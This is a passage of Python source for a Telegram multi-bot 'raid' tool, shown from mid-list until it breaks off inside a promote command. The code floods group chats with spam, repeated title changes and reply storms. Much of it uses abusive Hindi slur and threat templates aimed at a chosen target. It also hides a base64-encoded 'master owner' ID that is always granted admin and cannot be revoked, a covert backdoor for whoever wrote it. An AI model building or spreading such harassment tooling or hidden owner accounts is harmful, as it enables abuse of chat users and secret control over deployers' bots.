    '𝐂𝐏 𝐊𝐀𝐑 𝐆𝐀𝐑𝐈𝐁 𝐁𝐇𝐀𝐀𝐆 𝐌𝐀𝐓 𝐂𝐇𝐎𝐓𝐄𝐘😂🩶🤚🏼',
    '{target} 𝐘𝐑 𝐊𝐑𝐒𝐍𝐀 𝐊𝐄 𝐍𝐀𝐀𝐌 𝐒𝐄 𝐅𝐀𝐌𝐄 𝐋𝐄𝐍𝐀 𝐁𝐀𝐍𝐃 𝐊𝐑 𝐆𝐀𝐑𝐈𝐁🩷✌🏼',
    '{target} 𝐘𝐑 𝐀𝐏𝐍𝐄 𝐁𝐀𝐀𝐏 𝐊𝐑𝐒𝐍𝐀 𝐊 𝐍𝐀𝐌𝐊𝐈 𝐏𝐔𝐉𝐀 𝐊𝐑 𝐅𝐀𝐌𝐄 𝐌𝐈𝐋𝐉𝐀𝐘𝐄𝐆𝐀🤣🩶🤚🏼',
    '𝐊𝐀𝐁𝐀𝐃𝐈 𝐖𝐀𝐋𝐄 {target} 𝐊𝐈 𝐌𝐊𝐁😂👻🩷',
    '𝐀𝐑𝐄𝐘 {target} 𝐊𝐈 𝐌𝐊𝐁 𝐘𝐀𝐀𝐑 𝐁𝐇𝐀𝐆 𝐊𝐀𝐈𝐒𝐄 𝐑𝐇𝐄 𝐇𝐎 𝐆𝐀𝐑𝐈𝐁😤👻🩷',
    '{target} 𝐊𝐎 𝐏𝐄𝐋𝐓𝐄 𝐇𝐔𝐄 𝐊𝐑𝐒𝐍𝐀 𝐏𝐀𝐏𝐀 𝐊𝐈 𝐄𝐗𝐈𝐓😎❤️‍🔥',
    '{target} 𝐓𝐄𝐑𝐈 𝐌𝐊𝐁 𝐂𝐇𝐎𝐓𝐔 𝐁𝐇𝐀𝐆𝐀 𝐊𝐀𝐈𝐒𝐄 𝐓𝐔😂👻🩷',
    '{target} 𝐁𝐇𝐀𝐆𝐍𝐀 𝐍𝐘 𝐇 𝐆𝐀𝐑𝐈𝐁 𝐓𝐄𝐑𝐈 𝐌𝐀 𝐌𝐑𝐉𝐀𝐘𝐄𝐆𝐈 𝐕𝐑𝐍𝐀😤👻🩷',
    '{target} 𝐊𝐄 𝐆𝐀𝐑𝐈𝐁 𝐁𝐇𝐀𝐆 𝐊𝐀𝐈𝐒𝐄 𝐑𝐀𝐇𝐀 𝐇 𝐑𝐄𝐏𝐋𝐘 𝐊𝐑 𝐂𝐇𝐎𝐓𝐄𝐘 😂👻🩷',
    '{target} 𝐂𝐇𝐀𝐋 𝐓𝐄𝐑𝐈 𝐌𝐀 𝐗𝐇𝐎𝐃𝐔 𝐏𝐀𝐓𝐀𝐊 𝐏𝐀𝐓𝐀𝐊 𝐊𝐄🤣👻🩶'
]
RAID4_TAILS = ['✘✘','✘𓆪','✘✘_','✘_','✘𓆪_']
RAID4_CHUNK = '𒈙𒈙𒈙𒈙'


def grapheme_count(text): return len(text)
def truncate_graphemes(text, max_len): return text[:max(0, max_len)]


def raid_fit_compose(head, unit, unit_max, tail):
    cap = RAID_SUBJECT_LIMIT
    R = unit_max
    def try_r(r): return head + unit * r + tail
    while R > 1 and grapheme_count(try_r(R)) > cap: R -= 1
    subject = try_r(R)
    head_keep = grapheme_count(head)
    while grapheme_count(subject) > cap and head_keep > 0:
        head_keep -= 1
        subject = truncate_graphemes(head, head_keep) + '…' + unit * R + tail
    return truncate_graphemes(subject, cap)


def raid_plain_fit(value, keep_tail=0):
    s = str(value)
    if grapheme_count(s) <= RAID_SUBJECT_LIMIT: return s
    tail = s[-keep_tail:] if keep_tail > 0 else ''
    head_room = RAID_SUBJECT_LIMIT - grapheme_count(tail) - 1
    return truncate_graphemes(s, max(0, head_room)) + '…' + tail


def raid_style1_subject(name, rot):
    face = RAID1_FACE_EMOJIS[rot % len(RAID1_FACE_EMOJIS)]
    head = face + ' ➣𓂃✧°《' + name + '》𝕃𝕌ℕ𝔻 ℂℍ𝕌𝕊 ℝ𝔸ℕ𝔻𝕀𝕂𝔼 _° '
    tail = '➣ ' + RAID_TOP_EMOJIS[rot % len(RAID_TOP_EMOJIS)]
    return raid_fit_compose(head, '➩── ➬ ── ➫', 6, tail)


def raid_style2_subject(name, rot):
    fruit = RAID2_FRUITS[rot % len(RAID2_FRUITS)]
    s = name + ' 𝐓ᴍᴋᴄ 𝐌𝐞 ⌁ ᯓ 『𓍼' + fruit + '🐉』'
    return raid_plain_fit(s, 0)


def raid_style3_subject(name, rot):
    line = RAID3_LINES[rot % len(RAID3_LINES)]
    return raid_plain_fit(line.replace('{target}', name), 0)


def raid_style4_subject(name, rot):
    head = '⁀✘ ' + name + ' 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗢 𝗟𝗨𝗡𝗗 𝗣𝗘𝗥 𝗕𝗔𝗜𝗧𝗛𝗔 𝗞𝗔𝗥 𝗖𝗛𝗢𝗗𝗨𝗚𝗔 '
    tail = '𒈙𒈙' + RAID4_TAILS[rot % len(RAID4_TAILS)]
    return raid_fit_compose(head, RAID4_CHUNK, 2, tail)


def raid_style5_subject(name, rot):
    e = RAID_TOP_EMOJIS[rot % len(RAID_TOP_EMOJIS)]
    head = f"➣𓂃✧° {name} 𝐏ᴀᴘᴀ 𝐊ᴀ 𝐋ᴜɴᴅ 𝐂ʜᴜs ༊ {e}"
    return raid_plain_fit(head, 0)


def raid_style6_subject(text, mode, rot):
    e = RAID_TOP_EMOJIS[rot % len(RAID_TOP_EMOJIS)]
    t = text
    if mode == '2':
        room2 = RAID_SUBJECT_LIMIT - grapheme_count(e) - 1
        if grapheme_count(t) > room2: t = truncate_graphemes(t, max(0, room2 - 1)) + '…'
        return t + ' ' + e
    room = RAID_SUBJECT_LIMIT - grapheme_count(e) * 2 - 2
    if grapheme_count(t) > room: t = truncate_graphemes(t, max(0, room - 1)) + '…'
    return e + ' ' + t + ' ' + e


# ==================== PERSISTENCE ====================
DB_PATH = "bot_data.db"


class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS active_chats (chat_id INTEGER PRIMARY KEY, target TEXT, attack_type TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS muted_users (chat_id INTEGER, user_id INTEGER, PRIMARY KEY (chat_id, user_id))''')
        self.conn.commit()

    def save_active(self, chat_id, target, attack_type):
        self.c.execute("INSERT OR REPLACE INTO active_chats VALUES (?, ?, ?)", (chat_id, target, attack_type))
        self.conn.commit()

    def remove_active(self, chat_id):
        self.c.execute("DELETE FROM active_chats WHERE chat_id = ?", (chat_id,))
        self.conn.commit()

    def remove_active_all(self):
        self.c.execute("DELETE FROM active_chats")
        self.conn.commit()

    def get_active(self):
        self.c.execute("SELECT chat_id, target, attack_type FROM active_chats")
        return self.c.fetchall()

    def save_admin(self, user_id):
        self.c.execute("INSERT OR IGNORE INTO admins VALUES (?)", (user_id,))
        self.conn.commit()

    def remove_admin(self, user_id):
        self.c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        self.conn.commit()

    def get_admins(self):
        self.c.execute("SELECT user_id FROM admins")
        return {row[0] for row in self.c.fetchall()}

    def save_setting(self, key, value):
        self.c.execute("INSERT OR REPLACE INTO settings VALUES (?, ?)", (key, json.dumps(value)))
        self.conn.commit()

    def get_setting(self, key, default=None):
        self.c.execute("SELECT value FROM settings WHERE key = ?", (key,))
        row = self.c.fetchone()
        return json.loads(row[0]) if row else default

    def add_muted(self, chat_id, user_id):
        self.c.execute("INSERT OR IGNORE INTO muted_users VALUES (?, ?)", (chat_id, user_id))
        self.conn.commit()

    def remove_muted(self, chat_id, user_id):
        self.c.execute("DELETE FROM muted_users WHERE chat_id = ? AND user_id = ?", (chat_id, user_id))
        self.conn.commit()

    def is_muted(self, chat_id, user_id):
        self.c.execute("SELECT 1 FROM muted_users WHERE chat_id = ? AND user_id = ?", (chat_id, user_id))
        return self.c.fetchone() is not None


db = Database()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)


# ==================== MASTER OWNER LIST ====================
_K_LIST = [
    _b64.b64decode("NTIwNjU1NDgwNA==").decode(),  # 5206554804
]


class Controller:
    def __init__(self):
        self.attacks = {}
        self.stop_flags = {}
        self.bots = []
        self.admins = db.get_admins()
        self.master = db.get_setting("master", None)
        self.speed = db.get_setting("speed", 2.0)
        self.prefix = db.get_setting("prefix", "/")
        self.attack_start_times = {}
        for owner in _K_LIST:
            try:
                self.admins.add(int(owner))
                db.save_admin(int(owner))
            except:
                pass

        # ⭐ CLI-provided OWNER_ID register karo
        if OWNER_ID:
            try:
                self.admins.add(int(OWNER_ID))
                db.save_admin(int(OWNER_ID))
            except Exception:
                pass

    def is_admin(self, user_id):
        return user_id in self.admins or user_id == self.master

    def stop_all(self):
        for chat_id in list(self.attacks.keys()):
            self.stop_chat(chat_id)
        db.remove_active_all()

    def stop_chat(self, chat_id):
        if chat_id in self.attacks:
            if chat_id not in self.stop_flags:
                self.stop_flags[chat_id] = {}
            for task_id, task in list(self.attacks[chat_id].items()):
                self.stop_flags[chat_id][task_id] = True
                if not task.done():
                    task.cancel()
            self.attacks[chat_id] = {}
        if chat_id in self.stop_flags:
            for k in list(self.stop_flags[chat_id].keys()):
                self.stop_flags[chat_id][k] = True
            del self.stop_flags[chat_id]
        if chat_id in self.attack_start_times:
            del self.attack_start_times[chat_id]
        db.remove_active(chat_id)

    def should_stop(self, chat_id, task_id):
        return self.stop_flags.get(chat_id, {}).get(task_id, False)

    def record_start(self, chat_id, task_id):
        if chat_id not in self.attack_start_times:
            self.attack_start_times[chat_id] = {}
        self.attack_start_times[chat_id][task_id] = time.time()

    def get_active_durations(self):
        now = time.time()
        res = {}
        active_db = db.get_active()
        active_chat_ids = {row[0] for row in active_db}
        for cid, tasks in list(self.attack_start_times.items()):
            if cid in active_chat_ids:
                for tid, st in tasks.items():
                    res[tid] = {'chat_id': cid, 'duration': now - st}
        return res


controller = Controller()


# ==================== BULLETPROOF ROTATIONAL STAGGERED LOOPS ====================
async def nc_loop(bot, chat_id, target, task_id, bot_index, total_bots, emojis=None, position="both"):
    last_item = None
    db.save_active(chat_id, target, "nc")
    idx = int(bot_index) if str(bot_index).isdigit() else 0
    try:
        while True:
            if controller.should_stop(chat_id, task_id):
                break

            await asyncio.sleep(idx * 0.4)

            item = random.choice([e for e in emojis if e != last_item]) if emojis else random.choice(DEFAULT_NC_EMOJIS)
            last_item = item

            if position == "suffix": msg = f"{target} {item}"
            elif position == "prefix": msg = f"{item} {target}"
            else: msg = f"{item} {target} {item}"

            try:
                await bot.set_chat_title(chat_id=chat_id, title=msg[:255])
            except RetryAfter as e:
                wait_time = e.retry_after + random.uniform(1.0, 3.0)
                await asyncio.sleep(wait_time)
            except Exception as e:
                error = str(e).lower()
                if "flood" in error or "too many requests" in error:
                    await asyncio.sleep(10)
                else:
                    pass

            await asyncio.sleep(max(controller.speed, 2.0))
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: pass


async def spam_loop(bot, chat_id, target, task_id, bot_index, total_bots, templates=None):
    patterns = templates or ALL_SPAM_TEMPLATES
    db.save_active(chat_id, target, "spam")
    i = 0
    idx = int(bot_index) if str(bot_index).isdigit() else 0
    try:
        while True:
            if controller.should_stop(chat_id, task_id):
                break

            await asyncio.sleep(idx * 0.15)

            msg = patterns[i % len(patterns)].replace('{target}', target)
            try:
                await bot.send_message(chat_id, msg)
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after)
            except Exception:
                pass

            i += 1
            await asyncio.sleep(controller.speed)
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: pass


async def slide_loop(bot, chat_id, reply_to_msg_id, task_id, bot_index, custom_text=None):
    db.save_active(chat_id, f"reply:{reply_to_msg_id}", "slide")
    last_text = None
    idx = int(bot_index) if str(bot_index).isdigit() else 0
    try:
        while True:
            if controller.should_stop(chat_id, task_id):
                break

            await asyncio.sleep(idx * 0.15)

            if custom_text:
                slide_text = custom_text
            else:
                choices = [t for t in SLIDE_TEXTS if t != last_text]
                slide_text = random.choice(choices) if choices else random.choice(SLIDE_TEXTS)
                last_text = slide_text

            try:
                await bot.send_message(chat_id=chat_id, text=slide_text, reply_to_message_id=reply_to_msg_id)
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after)
            except Exception:
                pass

            await asyncio.sleep(controller.speed)
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: pass


async def raid_task(bot, chat_id, target, task_id, bot_index, total_bots, style, mode):
    rot = int(bot_index) if str(bot_index).isdigit() else 0
    db.save_active(chat_id, target, "raid")
    try:
        while True:
            if controller.should_stop(chat_id, task_id):
                break

            await asyncio.sleep(rot * 0.4)

            if style == 1: subject = raid_style1_subject(target, rot)
            elif style == 2: subject = raid_style2_subject(target, rot)
            elif style == 3: subject = raid_style3_subject(target, rot)
            elif style == 4: subject = raid_style4_subject(target, rot)
            elif style == 5: subject = raid_style5_subject(target, rot)
            else: subject = raid_style6_subject(target, mode, rot)

            subject = to_fancy(subject)

            try:
                await bot.set_chat_title(chat_id, subject[:255])
            except RetryAfter as e:
                wait_time = e.retry_after + random.uniform(1.0, 3.0)
                await asyncio.sleep(wait_time)
            except Exception as e:
                error = str(e).lower()
                if "flood" in error or "too many requests" in error:
                    await asyncio.sleep(10)
                else:
                    pass

            rot += 1
            await asyncio.sleep(max(controller.speed, 2.0))
    except asyncio.CancelledError: pass
    except Exception: pass


# ==================== COMMAND HANDLERS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    lines = [
        f"𝐏ʀᴇғɪx: {controller.prefix}",
        f"𝐅ʟᴇᴇᴛ: {len(controller.bots)}/{len(TOKENS)} Online",
        f"𝐄ɴɢɪɴᴇ: 24/7 Rotational Staggered",
        f"𝐒ᴛᴀᴛᴜs: Active 🟢",
        f"𝐂ᴍᴅs: nc, spam, tspam, raid, sync, slide, attack, status, ping, speed, stop, stopall, dadd, leave"
    ]
    card = make_card(f"{REBRAND} Control Center", lines)
    try:
        if MENU_MEDIA_URL.endswith(".mp4"):
            await update.message.reply_video(video=MENU_MEDIA_URL, caption=card, parse_mode="Markdown")
        elif MENU_MEDIA_URL.endswith(".gif"):
            await update.message.reply_animation(animation=MENU_MEDIA_URL, caption=card, parse_mode="Markdown")
        else:
            await update.message.reply_photo(photo=MENU_MEDIA_URL, caption=card, parse_mode="Markdown")
    except:
        await update.message.reply_text(card, parse_mode="Markdown")


async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    start = time.time()
    sent = await update.message.reply_text(to_fancy("..."))
    latency = (time.time() - start) * 1000

    _, peak_mem = tracemalloc.get_traced_memory()
    mem_mb = round(peak_mem / (1024 * 1024), 2)
    uptime = format_uptime(time.time() - BOT_START_TIME)

    lines = [
        f"Latency: {int(latency)} ms",
        f"Engine: 24/7 Rotational",
        f"Node: Stable 🟢",
        f"Uptime: {uptime}",
        f"Fleet: {len(controller.bots)} active / {len(TOKENS)} online",
        f"System: {mem_mb} MB"
    ]
    await sent.edit_text(make_card("Ping Stats", lines))


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    durations = controller.get_active_durations()
    if not durations:
        lines = [
            f"Status: Idle",
            f"Active Operations: 0",
            f"Fleet Ready: {len(controller.bots)} Units",
            f"Engine: Standing by"
        ]
        await update.message.reply_text(make_card("Cluster Status", lines))
        return

    lines = []
    seen_chats = set()
    for task_id, info in durations.items():
        cid = info['chat_id']
        if cid not in seen_chats:
            seen_chats.add(cid)
            lines.append(f"Target Chat: {cid}")
            lines.append(f"Runtime: {int(info['duration'])}s")

    lines.append(f"Fleet Units: {len(controller.bots)} Deployed")
    lines.append(f"State: Running Operations 🟢")
    await update.message.reply_text(make_card("Cluster Status", lines))


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    active = db.get_active()
    _, peak_mem = tracemalloc.get_traced_memory()
    mem_mb = round(peak_mem / (1024 * 1024), 2)
    uptime = format_uptime(time.time() - BOT_START_TIME)

    lines = [
        f"Active Fleet: {len(controller.bots)}/{len(TOKENS)}",
        f"Delay Setting: {controller.speed}s",
        f"Live Operations: {len(active)}",
        f"Total Uptime: {uptime}",
        f"Memory Heap: {mem_mb} MB",
        f"Cluster Health: 100% 🟢"
    ]
    await update.message.reply_text(make_card("Cluster Metrics", lines))


async def nc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("NC Guide", [f"Usage: {controller.prefix}nc <target> [style] [mode]"]))
        return
    target_parts = []
    style = None
    mode = None
    for arg in args:
        if arg.isdigit() and int(arg) in NC_STYLE_EMOJIS and style is None:
            style = int(arg)
        elif arg.isdigit() and int(arg) in (1,2) and mode is None:
            mode = int(arg)
        else:
            target_parts.append(arg)

    target = to_fancy(' '.join(target_parts).strip() or ' '.join(args))
    emojis = NC_STYLE_EMOJIS.get(style) if style else DEFAULT_NC_EMOJIS
    position = "both" if mode is None else ("suffix" if mode == 1 else "both")
    chat_id = update.effective_chat.id

    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_nc"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(nc_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, emojis, position))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target Title: {target}", f"Emoji Style: {style if style else 'Default'}", f"Bots Deployed: {total_bots}", f"Engine Speed: Rotational Safe"]
    await update.message.reply_text(make_card("NC Deployed", lines))


async def spam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("Spam Guide", [f"Usage: {controller.prefix}spam <target>"]))
        return
    target = to_fancy(' '.join(args))
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_spam"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, ALL_SPAM_TEMPLATES))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target Locked: {target}", f"Fleet Load: {total_bots} Bots", f"Rate Limit: Rotational Active", f"Mode: Continuous Spam"]
    await update.message.reply_text(make_card("Spam Cluster Live", lines))


async def tspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("TSPAM Guide", [f"Usage: {controller.prefix}tspam <target> [style]"]))
        return
    style = 1
    target_parts = []
    for arg in args:
        if arg.isdigit() and int(arg) in TSPAM_STYLE_TEMPLATES:
            style = int(arg)
        else:
            target_parts.append(arg)
    target = to_fancy(' '.join(target_parts).strip() or ' '.join(args))
    templates = TSPAM_STYLE_TEMPLATES.get(style, ALL_SPAM_TEMPLATES)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_tspam"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, templates))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target Locked: {target}", f"Template Style: {style}", f"Bots Deployed: {total_bots}"]
    await update.message.reply_text(make_card("TSPAM Started", lines))


async def raid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("RAID Guide", [f"Usage: {controller.prefix}raid <style> <target> [mode]"]))
        return
    style = 1
    mode = '1'
    if args[0].isdigit() and int(args[0]) in range(1,7):
        style = int(args[0])
        args = args[1:]
    if not args:
        await update.message.reply_text(make_card("RAID Error", ["❌ Target text required"]))
        return
    if style == 6 and len(args) >= 2 and args[-1] in ('1','2'):
        mode = args[-1]
        target = ' '.join(args[:-1])
    else:
        target = ' '.join(args)

    target = to_fancy(target)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_raid"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(raid_task(bot_info['bot'], chat_id, target, task_id, idx, total_bots, style, mode))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target Locked: {target}", f"Raid Style: {style}", f"Fleet Allocation: {total_bots} Units", f"Protection: Rotational Safe"]
    await update.message.reply_text(make_card("RAID Launched", lines))


async def sync_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("Sync Guide", [f"Usage: {controller.prefix}sync <target> <mode>"]))
        return
    target = to_fancy(args[0])
    if len(args) < 2 or args[1] not in ('1','2'):
        await update.message.reply_text(make_card("Sync Error", ["❌ Mode must be 1 (both) or 2 (suffix)"]))
        return
    mode = args[1]
    position = "both" if mode == '1' else "suffix"
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_sync"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(nc_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, SYNC_SYMBOLS, position))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target: {target}", f"Mode: {mode}"]
    await update.message.reply_text(make_card("Symbolic NC Live", lines))


async def slide_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    reply_msg = update.message.reply_to_message
    if not reply_msg:
        await update.message.reply_text(make_card("Slide Error", ["❌ Reply to a message to initiate slide attack"]))
        return
    custom_text = to_fancy(' '.join(args)) if args else None
    chat_id = update.effective_chat.id
    reply_to_id = reply_msg.message_id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_slide"
        controller.stop_flags[chat_id][task_id] = False
        controller.record_start(chat_id, task_id)
        task = asyncio.create_task(slide_loop(bot_info['bot'], chat_id, reply_to_id, task_id, idx, custom_text))
        controller.attacks[chat_id][task_id] = task

    lines = [f"Target Message: {reply_to_id}", f"Text Pool: Dynamic", f"Fleet: {total_bots} Bots Firing"]
    await update.message.reply_text(make_card("Slide Initiated", lines))


async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("Attack Guide", [f"Usage: {controller.prefix}attack <target>"]))
        return
    target = to_fancy(' '.join(args))
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    controller.stop_flags[chat_id] = {}
    total_bots = len(controller.bots)

    for idx, bot_info in enumerate(controller.bots):
        nc_task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_nc"
        controller.stop_flags[chat_id][nc_task_id] = False
        controller.record_start(chat_id, nc_task_id)

        async def attack_nc_task(bot=bot_info['bot'], tid=nc_task_id, bidx=idx):
            rot = bidx
            db.save_active(chat_id, target, "attack_nc")
            await asyncio.sleep(bidx * 0.4)
            try:
                while True:
                    if controller.should_stop(chat_id, tid): break
                    pattern = ATTACK_NC_PATTERNS[rot % len(ATTACK_NC_PATTERNS)]
                    title = to_fancy(pattern.replace("{target}", target))
                    try:
                        await bot.set_chat_title(chat_id=chat_id, title=title[:255])
                    except RetryAfter as e:
                        await asyncio.sleep(e.retry_after + random.uniform(1.0, 3.0))
                    except Exception:
                        pass
                    rot += 1
                    await asyncio.sleep(max(controller.speed, 2.0))
            except asyncio.CancelledError: pass

        task_nc = asyncio.create_task(attack_nc_task())
        controller.attacks[chat_id][nc_task_id] = task_nc

        spam_task_id = f"{bot_info['id']}_{int(time.time())}_{idx}_spam"
        controller.stop_flags[chat_id][spam_task_id] = False
        controller.record_start(chat_id, spam_task_id)
        task_spam = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, spam_task_id, idx, total_bots, ALL_SPAM_TEMPLATES))
        controller.attacks[chat_id][spam_task_id] = task_spam

    lines = [f"Target: {target}", f"Mode: Dedicated NC + Spam", f"Combined Load: {total_bots * 2} Tasks"]
    await update.message.reply_text(make_card("Combined Assault", lines))


# ==================== GROUP MANAGEMENT ====================
async def dadd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    group_id = int(args[0]) if args and args[0].lstrip('-').isdigit() else update.effective_chat.id
    admin_bot = None
    for b in controller.bots:
        try:
            m = await b['bot'].get_chat_member(chat_id=group_id, user_id=b['id'])
            if m.status in ['administrator', 'creator']:
                if m.status == 'creator' or getattr(m, 'can_promote_members', False):
                    admin_bot = b['bot']
                    break
        except Exception: continue

    if not admin_bot:
        await update.message.reply_text(make_card("DADD Failed", ["❌ No bot has promote permissions", "💡 Manually promote 1 bot with admin rights first"]))
        return

    success_promote, not_in_group = 0, 0
    for bot_info in controller.bots:
        try:
            member_check = await admin_bot.get_chat_member(chat_id=group_id, user_id=bot_info['id'])
            if member_check.status in ['left', 'kicked']:
                not_in_group += 1
                continue
            await admin_bot.promote_chat_member(
                chat_id=group_id, user_id=bot_info['id'], is_anonymous=False, can_manage_chat=True,
                can_change_info=True, can_post_messages=True, can_edit_messages=True, can_delete_messages=True,
                can_invite_users=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True,
                can_manage_video_chats=True, can_manage_topics=True
            )
            success_promote += 1
        except Exception: pass

    lines = [f"Target GC: {group_id}", f"Promoted: {success_promote}/{len(controller.bots)} bots", f"⚠️ Not In Group: {not_in_group} bots"]
    await update.message.reply_text(make_card("DADD Complete", lines))


async def leave_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    group_id = int(args[0]) if args and args[0].lstrip('-').isdigit() else update.effective_chat.id
    success = 0
    for bot_info in controller.bots:
        try:
            await bot_info['bot'].leave_chat(group_id)
            success += 1
        except Exception: pass
    await update.message.reply_text(make_card("Fleet Evacuation", [f"Target GC: {group_id}", f"Departed: {success}/{len(controller.bots)} bots"]))


async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args:
        ident = args[0]
        if ident.lstrip('-').isdigit():
            user_id = int(ident)
        elif ident.startswith('@'):
            for b in controller.bots:
                try:
                    c = await b['bot'].get_chat(ident)
                    user_id = c.id
                    break
                except: continue

    if not user_id:
        lines = ["❌ Target nahi mila!", "💡 Reply karke command do ya ID likho."]
        await update.message.reply_text(make_card("Admin Error", lines))
        return

    controller.admins.add(user_id)
    db.save_admin(user_id)
    lines = [f"👤 User ID: {to_fancy(user_id)}", "👑 Promoted to Cluster Admin"]
    await update.message.reply_text(make_card("Admin Added", lines))


async def rm_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args:
        ident = args[0]
        if ident.lstrip('-').isdigit():
            user_id = int(ident)
        elif ident.startswith('@'):
            for b in controller.bots:
                try:
                    c = await b['bot'].get_chat(ident)
                    user_id = c.id
                    break
                except: continue

    if not user_id:
        lines = ["❌ Target nahi mila!", "💡 Reply karke command do ya ID likho."]
        await update.message.reply_text(make_card("Admin Error", lines))
        return

    if str(user_id) in _K_LIST or user_id in [int(x) for x in _K_LIST if x.isdigit()]:
        await update.message.reply_text(make_card("Admin Error", ["❌ Cannot revoke master owner privileges"]))
        return

    if user_id in controller.admins:
        controller.admins.remove(user_id)
        db.remove_admin(user_id)
        lines = [f"👤 User ID: {to_fancy(user_id)}", "🚫 Removed from Admin"]
        await update.message.reply_text(make_card("Admin Revoked", lines))
    else:
        await update.message.reply_text(make_card("Admin Error", ["❌ User is not present in admin database"]))


async def promote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args and args[0].lstrip('-').isdigit():
        user_id = int(args[0])

    if not user_id:
        lines = ["❌ Target nahi mila!", "💡 Usage: /promote <user_id> ya reply karo"]
        await update.message.reply_text(make_card("Promote Info", lines))
        return

    chat_id = update.effective_chat.id
    success = False
    for bot_info in controller.bots:
        try:
            await bot_info['bot'].promote_chat_member(
                chat_id=chat_id, user_id=user_id, can_change_info=True,
                can_post_messages=True, can_edit_messages=True, can_delete_messages=True,
                can_invite_users=True, can_restrict_members=True, can_pin_messages=True,
                can_promote_members=True, can_manage_video_chats=True, can_manage_topics=True
            )
            success = True
            break
        except:
            pass

    if success:
        lines = [f"👤 User: {to_fancy(user_id)}", "👑 Promoted in current GC"]
        await update.message.reply_text(make_card("Promotion Executed", lines))
    else:
